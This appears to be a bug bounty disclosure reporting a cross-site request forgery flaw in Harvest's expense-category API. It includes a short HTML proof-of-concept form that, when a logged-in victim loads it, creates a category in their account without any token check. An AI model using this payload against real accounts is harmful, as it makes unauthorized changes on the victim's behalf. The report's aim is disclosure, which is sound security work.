Summary:

Hello,
 I Found Cross-Site Request Forgery (CSRF) while  made new Category 

POC :
```
<html>
  <body>
    <form action="https://[any_user_site].harvestapp.com/api/v2/expense_categories" 

method="POST">
      <input type="hidden" name="name" value="[category_name]" />
      <input type="hidden" name="unit&#95;price" value="" />
      <input type="hidden" name="unit&#95;name" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

just put user site and the name of the category on this HTML Form and the category 
will be created to this account.
there is no any token to validate the request here 
so the attacker can use this to made a  CSRF attack to any victim account


__Please Watch My POC I Attached For More Details__

Thanks
